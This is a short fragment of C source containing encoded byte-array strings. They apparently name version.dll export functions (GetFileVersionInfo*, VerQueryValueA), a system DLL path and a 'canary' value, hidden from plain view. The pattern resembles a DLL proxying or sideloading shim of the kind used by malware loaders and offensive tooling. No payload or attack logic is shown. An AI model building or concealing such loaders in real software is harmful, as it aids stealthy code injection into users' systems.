...
static const unsigned char xCanary[] = {
    0xC3, 0xBA, 0xF0, 0xD7, 0xEB, 0xEE, 0xE4, 0xEF,
    0xD7, 0xF1, 0xF0, 0xD4, 0xE5, 0xED, 0xF6, 0xF0,
    0xF6, 0xE5, 0xF2, 0xAF, 0xE3, 0xE1, 0xE3, 0xEC,
    0xE5, 0xA0, 0xEE, 0xEF, 0xE7
};
...
static const unsigned char xRealDll[] = {
    0xC3, 0xBA, 0xF0, 0xD7, 0xEB, 0xEE, 0xE4, 0xEF,
    0xD7, 0xF1, 0xF0, 0xD3, 0xF7, 0xF1, 0xF0, 0xE5,
    0xED, 0xA1, 0xA2, 0xF0, 0xF6, 0xE5, 0xF2, 0xF1,
    0xEB, 0xEF, 0xEE, 0xA0, 0xE4, 0xEE, 0xEE
};
...
static const unsigned char xE1[] = {
    0xC7, 0xE5, 0xF0, 0xC6, 0xEB, 0xEE, 0xE5, 0xD6,
    0xE5, 0xF2, 0xF1, 0xEB, 0xEF, 0xEE, 0xCB, 0xEE,
    0xE4, 0xEF, 0xC1
};
#define xE1_LEN 19
...
static const unsigned char xE3[] = {
    0xC7, 0xE5, 0xF0, 0xC6, 0xEB, 0xEE, 0xE5, 0xD6,
    0xE5, 0xF2, 0xF1, 0xEB, 0xEF, 0xEE, 0xCB, 0xEE,
    0xE4, 0xEF, 0xD3, 0xEB, 0xF4, 0xE5, 0xC1
};
#define xE3_LEN 23
...
static const unsigned char xE4[] = {
    0xC7, 0xE5, 0xF0, 0xC6, 0xEB, 0xEE, 0xE5, 0xD6,
    0xE5, 0xF2, 0xF1, 0xEB, 0xEF, 0xEE, 0xCB, 0xEE,
    0xE4, 0xEF, 0xD3, 0xEB, 0xF4, 0xE5, 0xD7
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xD6, 0xE5, 0xF2, 0xD3, 0xF1, 0xE5, 0xF2, 0xF7,
    0xD6, 0xE1, 0xEE, 0xF1, 0xE5, 0xC1
};
#define xE5_LEN 14
